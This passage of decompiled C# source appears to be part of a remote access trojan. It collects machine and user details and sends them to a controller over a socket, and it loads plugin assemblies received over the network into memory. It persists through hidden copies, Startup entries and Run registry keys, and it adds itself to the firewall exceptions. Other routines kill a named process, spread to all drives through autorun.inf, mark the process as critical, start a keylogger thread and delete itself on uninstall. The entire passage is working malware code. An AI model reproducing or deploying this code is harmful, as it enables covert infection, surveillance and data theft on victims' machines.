              while (!(OK.PLG != null | num == 20 | !OK.Cn))
              {
                checked { ++num; }
                Thread.Sleep(1000);
              }
              if (OK.PLG == null | !OK.Cn)
                return;
            }
            object[] Arguments = new object[1]{ (object) b };
            bool[] CopyBack = new bool[1]{ true };
            NewLateBinding.LateCall(RuntimeHelpers.GetObjectValue(OK.PLG), (System.Type) null, "ind", Arguments, (string[]) null, (System.Type[]) null, CopyBack, true);
            if (CopyBack[0])
              b = (byte[]) Conversions.ChangeType(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(Arguments[0]))), typeof (byte[]));
          }
          else if (Operators.CompareString(Left1, "PLG", false) == 0)
          {
            MemoryStream memoryStream = new MemoryStream();
            int length = (strArray1[0] + OK.Y).Length;
            memoryStream.Write(b, length, checked (b.Length - length));
            OK.PLG = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(OK.Plugin(OK.ZIP(memoryStream.ToArray()), "A"))));
            NewLateBinding.LateSet(RuntimeHelpers.GetObjectValue(OK.PLG), (System.Type) null, "H", new object[1]
            {
              (object) OK.H
            }, (string[]) null, (System.Type[]) null);
            NewLateBinding.LateSet(RuntimeHelpers.GetObjectValue(OK.PLG), (System.Type) null, "P", new object[1]
            {
              (object) OK.P
            }, (string[]) null, (System.Type[]) null);
            NewLateBinding.LateSet(RuntimeHelpers.GetObjectValue(OK.PLG), (System.Type) null, "c", new object[1]
            {
              (object) OK.C
            }, (string[]) null, (System.Type[]) null);
          }
        }
      }
      catch (Exception ex3)
      {
        ProjectData.SetProjectError(ex3);
        Exception ex4 = ex3;
        ProjectData.SetProjectError(ex4);
        Exception exception = ex4;
        if (strArray1.Length > 0 && Operators.CompareString(strArray1[0], "Ex", false) == 0 | Operators.CompareString(strArray1[0], "PLG", false) == 0)
          OK.PLG = (object) null;
        try
        {
          OK.Send("ER" + OK.Y + strArray1[0] + OK.Y + exception.Message);
        }
        catch (Exception ex5)
        {
          ProjectData.SetProjectError(ex5);
          ProjectData.ClearProjectError();
        }
        ProjectData.ClearProjectError();
      }
    }

    public static string inf()
    {
      string str1 = "ll" + OK.Y;
      string str2;
      try
      {
        if (Operators.ConditionalCompareObjectEqual(RuntimeHelpers.GetObjectValue(OK.GTV("vn", (object) "")), (object) "", false))
        {
          string str3 = str1;
          string s = OK.DEB(ref OK.VN) + "_" + OK.HWD();
          string str4 = OK.ENB(ref s);
          string y = OK.Y;
          str2 = str3 + str4 + y;
        }
        else
        {
          string str5 = str1;
          string s1 = Conversions.ToString(RuntimeHelpers.GetObjectValue(OK.GTV("vn", (object) "")));
          string s2 = OK.DEB(ref s1) + "_" + OK.HWD();
          string str6 = OK.ENB(ref s2);
          string y = OK.Y;
          str2 = str5 + str6 + y;
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        string str7 = str1;
        string s = OK.HWD();
        string str8 = OK.ENB(ref s);
        string y = OK.Y;
        str2 = str7 + str8 + y;
        ProjectData.ClearProjectError();
      }
      string str9;
      try
      {
        str9 = str2 + Environment.MachineName + OK.Y;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        str9 = str2 + "??" + OK.Y;
        ProjectData.ClearProjectError();
      }
      string str10;
      try
      {
        str10 = str9 + Environment.UserName + OK.Y;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        str10 = str9 + "??" + OK.Y;
        ProjectData.ClearProjectError();
      }
      string str11;
      try
      {
        str11 = str10 + OK.LO.LastWriteTime.Date.ToString("yy-MM-dd") + OK.Y;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        str11 = str10 + "??-??-??" + OK.Y;
        ProjectData.ClearProjectError();
      }
      string str12 = str11 + "" + OK.Y;
      string str13;
      try
      {
        str13 = str12 + OK.F.Info.OSFullName.Replace("Microsoft", "").Replace("Windows", "Win").Replace("®", "").Replace("™", "").Replace("  ", " ").Replace(" Win", "Win");
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        str13 = str12 + "??";
        ProjectData.ClearProjectError();
      }
      string str14 = str13 + "SP";
      string str15;
      try
      {
        string[] strArray = Strings.Split(Environment.OSVersion.ServicePack);
        if (strArray.Length == 1)
          str14 += "0";
        str15 = str14 + strArray[checked (strArray.Length - 1)];
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        str15 = str14 + "0";
        ProjectData.ClearProjectError();
      }
      string str16;
      try
      {
        str16 = !Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles).Contains("x86") ? str15 + " x86" + OK.Y : str15 + " x64" + OK.Y;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        str16 = str15 + OK.Y;
        ProjectData.ClearProjectError();
      }
      string str17 = (!OK.Cam() ? str16 + "No" + OK.Y : str16 + "Yes" + OK.Y) + OK.VR + OK.Y + ".." + OK.Y + OK.ACT() + OK.Y;
      string str18 = "";
      try
      {
        string[] valueNames = OK.F.Registry.CurrentUser.CreateSubKey("Software\\" + OK.RG, RegistryKeyPermissionCheck.Default).GetValueNames();
        int index = 0;
        while (index < valueNames.Length)
        {
          string str19 = valueNames[index];
          if (str19.Length == 32)
            str18 = str18 + str19 + ",";
          checked { ++index; }
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      return str17 + str18;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    public static void INS()
    {
      Thread.Sleep(1000);
      if (OK.Idr && !OK.CompDir(OK.LO, new FileInfo(Interaction.Environ(OK.DR).ToLower() + "\\" + OK.EXE.ToLower())))
      {
        try
        {
          System.IO.File.SetAttributes(Application.ExecutablePath, FileAttributes.Hidden);
          if (System.IO.File.Exists(Interaction.Environ(OK.DR) + "\\" + OK.EXE))
            System.IO.File.Delete(Interaction.Environ(OK.DR) + "\\" + OK.EXE);
          System.IO.File.Copy(OK.LO.FullName, Interaction.Environ(OK.DR) + "\\" + OK.EXE, true);
          Process.Start(Interaction.Environ(OK.DR) + "\\" + OK.EXE);
          ProjectData.EndApp();
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.EndApp();
          ProjectData.ClearProjectError();
        }
      }
      try
      {
        Interaction.Shell("netsh firewall add allowedprogram \"" + OK.LO.FullName + "\" \"" + OK.LO.Name + "\" ENABLE", AppWinStyle.Hide);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      if (OK.Isu)
      {
        try
        {
          OK.F.Registry.CurrentUser.OpenSubKey(OK.sf, true).SetValue(OK.RG, (object) ("\"" + OK.LO.FullName + "\" .."));
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
        try
        {
          OK.F.Registry.LocalMachine.OpenSubKey(OK.sf, true).SetValue(OK.RG, (object) ("\"" + OK.LO.FullName + "\" .."));
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      if (OK.IsF)
      {
        try
        {
          System.IO.File.SetAttributes(Application.ExecutablePath, FileAttributes.Hidden);
          System.IO.File.Copy(OK.LO.FullName, Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + OK.RG + ".exe", true);
          OK.FS = new FileStream(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + OK.RG + ".exe", FileMode.Open);
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      if (OK.anti2)
        Interaction.Shell("taskkill /F /IM " + OK.anti, AppWinStyle.Hide);
      if (OK.HD)
      {
        try
        {
          System.IO.File.SetAttributes(Application.ExecutablePath, FileAttributes.Hidden);
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      if (!OK.usb)
        return;
      string str1 = "autorun.inf";
      string usbx = OK.usbx;
      FileAttributes fileAttributes = FileAttributes.Hidden;
      string programFiles = MyProject.Computer.FileSystem.SpecialDirectories.ProgramFiles;
      string[] logicalDrives = Directory.GetLogicalDrives();
      int index = 0;
      while (index < logicalDrives.Length)
      {
        string str2 = logicalDrives[index];
        try
        {
          System.IO.File.Copy(Application.ExecutablePath, str2 + usbx);
          System.IO.File.SetAttributes(str2 + usbx, fileAttributes);
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
        try
        {
          StreamWriter streamWriter = new StreamWriter(str2 + "\\" + str1);
          streamWriter.WriteLine("[autorun]");
          streamWriter.WriteLine("open=" + str2 + usbx);
          streamWriter.WriteLine("shellexecute=" + str2, (object) 1);
          streamWriter.Close();
          System.IO.File.SetAttributes(str2 + str1, fileAttributes);
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
        checked { ++index; }
      }
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    public static void ko()
    {
      if (Interaction.Command() != null)
      {
        try
        {
          OK.F.Registry.CurrentUser.SetValue("di", (object) "!");
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
        Thread.Sleep(5000);
      }
      bool createdNew = false;
      OK.MT = (object) new Mutex(true, OK.RG, out createdNew);
      if (!createdNew)
        ProjectData.EndApp();
      OK.INS();
      if (!OK.Idr)
      {
        OK.EXE = OK.LO.Name;
        OK.DR = OK.LO.Directory.Name;
      }
      new Thread(new ThreadStart(OK.RC), 1).Start();
      try
      {
        OK.kq = new kl();
        new Thread(new ThreadStart(OK.kq.WRK), 1).Start();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      if (OK.task)
        new Thread(new ThreadStart(new mgr().protect)).Start();
      int num = 0;
      string Left = "";
      if (OK.BD)
      {
        try
        {
          SystemEvents.SessionEnding += new SessionEndingEventHandler(OK.im);
          OK.pr(1);
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      while (true)
      {
        Thread.Sleep(1000);
        if (!OK.Cn)
          Left = "";
        Application.DoEvents();
        try
        {
          checked { ++num; }
          if (num == 5)
          {
            try
            {
              Process.GetCurrentProcess().MinWorkingSet = (IntPtr) 1024;
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              ProjectData.ClearProjectError();
            }
          }
          if (num >= 8)
          {
            num = 0;
            string Right = OK.ACT();
            if (Operators.CompareString(Left, Right, false) != 0)
            {
              Left = Right;
              OK.Send("act" + OK.Y + Right);
            }
          }
          if (OK.Isu)
          {
            try
            {
              if (Operators.ConditionalCompareObjectNotEqual(RuntimeHelpers.GetObjectValue(OK.F.Registry.CurrentUser.GetValue(OK.sf + "\\" + OK.RG, (object) "")), (object) ("\"" + OK.LO.FullName + "\" .."), false))
                OK.F.Registry.CurrentUser.OpenSubKey(OK.sf, true).SetValue(OK.RG, (object) ("\"" + OK.LO.FullName + "\" .."));
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              ProjectData.ClearProjectError();
            }
            try
            {
              if (Operators.ConditionalCompareObjectNotEqual(RuntimeHelpers.GetObjectValue(OK.F.Registry.LocalMachine.GetValue(OK.sf + "\\" + OK.RG, (object) "")), (object) ("\"" + OK.LO.FullName + "\" .."), false))
                OK.F.Registry.LocalMachine.OpenSubKey(OK.sf, true).SetValue(OK.RG, (object) ("\"" + OK.LO.FullName + "\" .."));
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              ProjectData.ClearProjectError();
            }
          }
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
    }

    public static string md5(byte[] B)
    {
      B = new MD5CryptoServiceProvider().ComputeHash(B);
      string str = "";
      byte[] numArray = B;
      int index = 0;
      while (index < numArray.Length)
      {
        byte num = numArray[index];
        str += num.ToString("x2");
        checked { ++index; }
      }
      return str;
    }

    [DllImport("ntdll")]
    private static extern int NtSetInformationProcess(
      IntPtr hProcess,
      int processInformationClass,
      ref int processInformation,
      int processInformationLength);

    public static object Plugin(byte[] b, string c)
    {
      Module[] modules = Assembly.Load(b).GetModules();
      int num1 = checked (modules.Length - 1);
      int index1 = 0;
      while (index1 <= num1)
      {
        Module module = modules[index1];
        System.Type[] types = module.GetTypes();
        int num2 = checked (types.Length - 1);
        int index2 = 0;
        while (index2 <= num2)
        {
          System.Type type = types[index2];
          if (type.FullName.EndsWith("." + c))
            return module.Assembly.CreateInstance(type.FullName);
          checked { ++index2; }
        }
        checked { ++index1; }
      }
      return (object) null;
    }

    public static void pr(int i)
    {
      try
      {
        OK.NtSetInformationProcess(Process.GetCurrentProcess().Handle, 29, ref i, 4);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void RC()
    {
      while (true)
      {
        OK.lastcap = "";
        if (OK.C != null)
        {
          long num1 = -1;
          int num2 = 0;
          try
          {
            while (true)
            {
              do
              {
                checked { ++num2; }
                if (num2 == 10)
                {
                  num2 = 0;
                  Thread.Sleep(1);
                }
                if (OK.Cn)
                {
                  if (OK.C.Available < 1)
                    OK.C.Client.Poll(-1, SelectMode.SelectRead);
label_10:
                  do
                  {
                    if (OK.C.Available > 0)
                    {
                      if (num1 == -1L)
                      {
                        string str = "";
                        while (true)
                        {
                          int CharCode = OK.C.GetStream().ReadByte();
                          switch (CharCode)
                          {
                            case -1:
                              goto label_26;
                            case 0:
                              num1 = Conversions.ToLong(str);
                              if (num1 == 0L)
                              {
                                OK.Send("");
                                num1 = -1L;
                              }
                              goto label_10;
                            default:
                              str += Conversions.ToString(Conversions.ToInteger(Strings.ChrW(CharCode).ToString()));
                              continue;
                          }
                        }
                        goto label_19;
                      }
                      else
                        goto label_19;
                    }
                    else
                      goto label_24;
                  }
                  while (OK.C.Available > 0);
                  continue;
label_19:
                  OK.b = new byte[checked (OK.C.Available + 1 - 1 + 1)];
                  long num3 = checked (num1 - OK.MeM.Length);
                  if ((long) OK.b.Length > num3)
                    OK.b = new byte[checked ((int) (num3 - 1L) + 1 - 1 + 1)];
                  int count = OK.C.Client.Receive(OK.b, 0, OK.b.Length, SocketFlags.None);
                  OK.MeM.Write(OK.b, 0, count);
                }
                else
                  goto label_26;
              }
              while (OK.MeM.Length != num1);
              num1 = -1L;
              Thread thread = new Thread(new ParameterizedThreadStart(OK.im), 1);
              thread.Start((object) OK.MeM.ToArray());
              thread.Join(100);
              OK.MeM.Dispose();
              OK.MeM = new MemoryStream();
            }
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
label_24:;
        }
label_26:
        do
        {
          try
          {
            if (OK.PLG != null)
            {
              NewLateBinding.LateCall(RuntimeHelpers.GetObjectValue(OK.PLG), (System.Type) null, "clear", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null, true);
              OK.PLG = (object) null;
            }
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
          OK.Cn = false;
        }
        while (!OK.connect());
        OK.Cn = true;
      }
    }

    public static byte[] SB(ref string S) => Encoding.UTF8.GetBytes(S);

    public static bool Send(string S) => OK.Sendb(OK.SB(ref S));

    public static bool Sendb(byte[] b)
    {
      if (!OK.Cn)
        return false;
      try
      {
        lock (OK.LO)
        {
          if (!OK.Cn)
            return false;
          MemoryStream memoryStream = new MemoryStream();
          string S = b.Length.ToString() + "\0";
          byte[] buffer = OK.SB(ref S);
          memoryStream.Write(buffer, 0, buffer.Length);
          memoryStream.Write(b, 0, b.Length);
          OK.C.Client.Send(memoryStream.ToArray(), 0, checked ((int) memoryStream.Length), SocketFlags.None);
        }
      }
      catch (Exception ex1)
      {
        ProjectData.SetProjectError(ex1);
        ProjectData.SetProjectError(ex1);
        try
        {
          if (OK.Cn)
          {
            OK.Cn = false;
            OK.C.Close();
          }
        }
        catch (Exception ex2)
        {
          ProjectData.SetProjectError(ex2);
          ProjectData.ClearProjectError();
        }
        ProjectData.ClearProjectError();
      }
      return OK.Cn;
    }

    public static bool STV(string n, object t, RegistryValueKind typ)
    {
      bool flag;
      try
      {
        OK.F.Registry.CurrentUser.CreateSubKey("Software\\" + OK.RG).SetValue(n, RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(t))), typ);
        flag = true;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        flag = false;
        ProjectData.ClearProjectError();
      }
      return flag;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    public static void UNS()
    {
      OK.pr(0);
      OK.Isu = false;
      try
      {
        System.IO.File.SetAttributes(Application.ExecutablePath, FileAttributes.Normal);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      try
      {
        OK.F.Registry.CurrentUser.OpenSubKey(OK.sf, true).DeleteValue(OK.RG, false);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      try
      {
        OK.F.Registry.LocalMachine.OpenSubKey(OK.sf, true).DeleteValue(OK.RG, false);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      try
      {
        Interaction.Shell("netsh firewall delete allowedprogram \"" + OK.LO.FullName + "\"", AppWinStyle.Hide);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      try
      {
        if (OK.FS != null)
        {
          System.IO.File.SetAttributes(Application.ExecutablePath, FileAttributes.Normal);
          OK.FS.Dispose();
          System.IO.File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + OK.RG + ".exe");
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      try
      {
        OK.F.Registry.CurrentUser.OpenSubKey("Software", true).DeleteSubKey(OK.RG, false);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      try
      {
        System.IO.File.SetAttributes(Application.ExecutablePath, FileAttributes.Normal);
        Interaction.Shell("cmd.exe /k ping 0 & del \"" + OK.LO.FullName + "\" & exit", AppWinStyle.Hide);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      ProjectData.EndApp();
    }

    public static byte[] ZIP(byte[] B)
    {
      MemoryStream memoryStream = new MemoryStream(B);
      GZipStream gzipStream = new GZipStream((Stream) memoryStream, CompressionMode.Decompress);
      byte[] buffer = new byte[4];
      memoryStream.Position = checked (memoryStream.Length - 5L);
      memoryStream.Read(buffer, 0, 4);
      int int32 = BitConverter.ToInt32(buffer, 0);
      memoryStream.Position = 0L;
      byte[] array = new byte[checked (int32 - 1 + 1 - 1 + 1)];
      gzipStream.Read(array, 0, int32);
      gzipStream.Dispose();
      memoryStream.Dispose();
      return array;
    }
  }
}
